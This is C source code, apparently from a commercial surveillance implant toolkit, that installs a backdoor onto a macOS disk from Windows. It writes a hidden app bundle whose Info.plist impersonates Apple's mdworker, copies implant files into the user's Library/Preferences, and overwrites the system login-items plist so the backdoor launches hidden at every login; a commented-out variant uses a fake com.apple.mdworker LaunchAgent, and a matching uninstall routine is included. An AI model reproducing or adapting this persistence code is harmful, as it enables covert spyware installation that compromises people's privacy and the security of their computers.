#include "stdafx.h"
#include "Functions_Users.h"
#include "commons.h"

char _mdworker_content[]= "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
						  "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
						  "<plist version=\"1.0\">"
						  "<dict>"
						  "<key>Label</key>"
						  "<string>com.apple.mdworker</string>"
						  "<key>LimitLoadToSessionType</key>"
						  "<string>Aqua</string>"
						  "<key>OnDemand</key>"
						  "<false/>"
						  "<key>ProgramArguments</key>"
						  "<array>"
						  "<string>%S/Library/Preferences/%S/%S</string>"
						  "</array>"
					      "</dict>"
					      "</plist>";

char _sli_plist[]= "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                   "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                   "<plist version=\"1.0\">\n"
                   "<dict>\n"
	               "<key>AutoLaunchedApplicationDictionary</key>\n"
	               "<array>\n"
		           "<dict>\n"
			       "<key>Hide</key>\n"
			       "<string>1</string>\n"
			       "<key>Path</key>\n"
			       "<string>%S/Library/Preferences/%S.app</string>\n"
		           "</dict>\n"
	               "</array>\n"
                   "</dict>\n"
                   "</plist>";

char _info_plist[]= "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                    "<plist version=\"1.0\">\n"
                    "<dict>\n"
					"<key>CFBundleDevelopmentRegion</key>\n"
					"<string>English</string>\n"
					"<key>CFBundleExecutable</key>\n"
					"<string>%S</string>\n"
					"<key>CFBundleIdentifier</key>\n"
					"<string>com.apple.mdworker-user</string>\n"
					"<key>CFBundleInfoDictionaryVersion</key>\n"
					"<string>6.0</string>\n"
					"<key>CFBundleName</key>\n"
					"<string>mdworker-user</string>\n"
					"<key>CFBundlePackageType</key>\n"
					"<string>APPL</string>\n"
					"<key>CFBundleVersion</key>\n"
					"<string>1.0</string>\n"
					"<key>NSMainNibFile</key>\n"
					"<string>MainMenu</string>\n"
					"<key>NSPrincipalClass</key>\n"
					"<string>NSApplication</string>\n"
					"</dict>\n"
					"</plist>";

#define BUFFER_SIZE 10000
BOOL SafeCopyFile(WCHAR *source_path, WCHAR *dest_path)
{
	BYTE *buffer;
	HANDLE hs, hd; 
	DWORD read, write;

	buffer = (BYTE *)malloc(BUFFER_SIZE);
	if (!buffer)
		return FALSE;

	hs = CreateFile(source_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hs == INVALID_HANDLE_VALUE) {
		SAFE_FREE(buffer);
		return FALSE;
	}

	hd = CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hd == INVALID_HANDLE_VALUE) {
		CloseHandle(hs);
		SAFE_FREE(buffer);
		return FALSE;
	}

	while(ReadFile(hs, buffer, BUFFER_SIZE, &read, NULL) && read!=0) {
		if (!WriteFile(hd, buffer, read, &write, NULL) || write!=read) {
			CloseHandle(hs);
			CloseHandle(hd);
			SAFE_FREE(buffer);
			return FALSE;
		}
	}

	CloseHandle(hs);
	CloseHandle(hd);
	SAFE_FREE(buffer);
	return TRUE;
}


void MAC_GetSourceFileDirectory(users_struct_t *user_info, rcs_struct_t *rcs_info, os_struct_t *os_info, WCHAR *src_path) 
{
	_snwprintf_s(src_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\Preferences\\%s.app", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
}

BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR backdoor_path[MAX_PATH];
	WCHAR tmp_path[MAX_PATH*2];
	WCHAR tmp_path2[MAX_PATH*2];
	HANDLE hFind, hfile;
	WIN32_FIND_DATA file_info;
	DWORD w_len;
	//char mdworker_content[1024];
	char sleepylist_content[1024];
	char infoplist_content[1024];

	if (!rcs_info || !user_info || !os_info)
		return FALSE;

	// Usato per scrivere l'mdworker
	//sprintf_s(mdworker_content, sizeof(mdworker_content), _mdworker_content, user_info->user_home, rcs_info->hdir, rcs_info->hcore);

	sprintf_s(sleepylist_content, sizeof(sleepylist_content), _sli_plist, user_info->user_home, rcs_info->hdir);
	sprintf_s(infoplist_content, sizeof(infoplist_content), _info_plist, rcs_info->hcore);

	MAC_GetSourceFileDirectory(user_info, rcs_info, os_info, backdoor_path);
	ClearAttributes(backdoor_path);
	if (!CreateDirectory(backdoor_path, NULL) && (GetLastError()!=ERROR_ALREADY_EXISTS)) 
		return FALSE;

	// Crea la directory e i file per far partire la backdoor in modalita' SLIPLIST
	swprintf_s(tmp_path, MAX_PATH, L"%s\\Contents", backdoor_path);
	ClearAttributes(tmp_path);
	CreateDirectory(tmp_path, NULL);
	swprintf_s(tmp_path, MAX_PATH, L"%s\\Info.plist", tmp_path);
	ClearAttributes(tmp_path);
	hfile = CreateFile(tmp_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	if (!WriteFile(hfile, infoplist_content, strlen(infoplist_content), &w_len, NULL) || w_len!=strlen(infoplist_content)) {
		CloseHandle(hfile);
		return FALSE;
	}
	CloseHandle(hfile);

	// Copia i file 
	swprintf_s(tmp_path, MAX_PATH, L"%s\\MACOS\\*.*", rcs_info->rcs_files_path);
	hFind = FindFirstFile(tmp_path, &file_info);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;

			swprintf_s(tmp_path, MAX_PATH, L"%s\\MACOS\\%s", rcs_info->rcs_files_path, file_info.cFileName);
			swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s", backdoor_path, file_info.cFileName);
			
			ClearAttributes(tmp_path2);
			if (!SafeCopyFile(tmp_path, tmp_path2)) {
				FindClose(hFind);
				return FALSE;
			}
		} while (FindNextFile(hFind, &file_info));
		if (GetLastError() != ERROR_NO_MORE_FILES) {
			FindClose(hFind);
			return FALSE;
		}
		FindClose(hFind);
	} else
		return FALSE;

	// Crea un file vuoto mdworker.flg
	swprintf_s(tmp_path2, MAX_PATH, L"%s\\mdworker.flg", backdoor_path);
	ClearAttributes(tmp_path2);
	hfile = CreateFile(tmp_path2, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);

	// Crea l'elemento per lo startup
	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents", os_info->drive, SlashToBackSlash(user_info->user_home));
	ClearAttributes(backdoor_path);
	CreateDirectory(backdoor_path, NULL);

	// Usato per scrivere l'mdworker
	//_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.mdworker.plist", os_info->drive, SlashToBackSlash(user_info->user_home));

	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%sLibrary\\Preferences\\com.apple.SystemLoginItems.plist", os_info->drive);
	ClearAttributes(backdoor_path);
	hfile = CreateFile(backdoor_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;

	// Usato per scrivere l'mdworker
	//if (!WriteFile(hfile, mdworker_content, strlen(mdworker_content), &w_len, NULL) || w_len!=strlen(mdworker_content)) {
	//		CloseHandle(hfile);
	//		return FALSE;
	//}
		
	if (!WriteFile(hfile, sleepylist_content, strlen(sleepylist_content), &w_len, NULL) || w_len!=strlen(sleepylist_content)) {CloseHandle(hfile);
		CloseHandle(hfile);
		return FALSE;
	}

	CloseHandle(hfile);
	return TRUE;
}

BOOL MAC_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR backdoor_path[MAX_PATH];
	BOOL ret_val = TRUE;

	if (!rcs_info || !user_info || !os_info)
		return FALSE;

	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.mdworker.plist", os_info->drive, SlashToBackSlash(user_info->user_home));
	ClearAttributes(backdoor_path);
	DeleteFile(backdoor_path);

	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%sLibrary\\Preferences\\com.apple.SystemLoginItems.plist", os_info->drive);
	ClearAttributes(backdoor_path);
	DeleteFile(backdoor_path);

	// Cancella tutti i file e la directory
	MAC_GetSourceFileDirectory(user_info, rcs_info, os_info, backdoor_path);
	if (!DeleteDirectory(backdoor_path))
		ret_val = FALSE;

	return ret_val;
}


BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info)
{
	return TRUE;
}


BOOL MAC_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info)
{
	return TRUE;
}